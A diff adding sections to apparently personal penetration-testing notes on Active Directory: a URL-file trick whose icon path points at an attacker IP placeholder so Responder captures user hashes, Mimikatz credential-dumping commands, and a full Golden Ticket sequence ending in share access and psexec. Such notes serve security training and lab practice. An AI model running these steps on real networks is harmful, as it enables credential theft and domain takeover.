@@ -176,6 +176,75 @@ Example using Active on HackTheBox.
 
 ## URL File Attacks
 
+Requires compromised user account of an open file share.
+
+Create a file:
+
+```
+[InternetShortcut] 
+URL=blah 
+WorkingDirectory=blah 
+IconFile=\<ATACKER IP>%USERNAME%.icon 
+IconIndex=1Mimikatz
+```
+
+Save file at "@test.url". Needs '@' and '.url' which will ensure it ends up at the top of the folder.
+
+Then place it on a file share.
+
+Then run Responder: `responder -I eth0 -v`
+
+Now when a user navigates to the file share, responder will capture hashes.
+
+#### Resources
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
+
 ## Mimikatz
 
+### Overview
+
+#### What is Mimikatz?
+
+* Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
+* Dumps credentials stored in memory
+* Just a few attacks: Credential dumping, Pass-the-hash, Over-pass-the-hash, Pass-the-ticket, Golden Ticket, Silver Ticket
+
+### Credential Dumping
+
+Assuming we have already compromised the Domain Controller
+
+```powershell
+mimikatz
+privilege::debug
+sekurlsa::logonpasswords  # Check for logon users passwords in memory
+lsadump::sam  # Try to dump the SAM
+lsadump::lsa /patch  # Try to dump the LSA
+```
+
 ## Golden Ticket Attacks
+
+```powershell
+mimikatz
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+# Copy the SID of the domain ex: S-1-5-21-xxxx-xxxx-xxxx
+# Copy the NTLM Hash of the kerberos TGT account
+kerberos::golden /User:Administrator /domain:marvel.local /sid:<SID> /krbtgt:<NTLM Hash> /id:500 /ptt
+# Look for "Golden ticket for ... successfully submitted for current session
+misc::cmd  # Start a command prompt utilizing session using golden ticket we created
+dir \\THEPUNISHER\c$  # We have access to this machine
+# And then can try psexec.exe \\THEPUNISHER cmd.exe
+```
+
+## Additional Resources
+
+Active Directory Security Blog: [https://adsecurity.org/](https://adsecurity.org)
+
+Harmj0y Blog: [http://blog.harmj0y.net/](http://blog.harmj0y.net)
+
+Pentester Academy Active Directory: [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)
+
+Pentester Academy Red Team Labs: [https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)
+
+eLS PTX: [https://elearnsecurity.com/product/ecptx-certification/](https://elearnsecurity.com/product/ecptx-certification/)
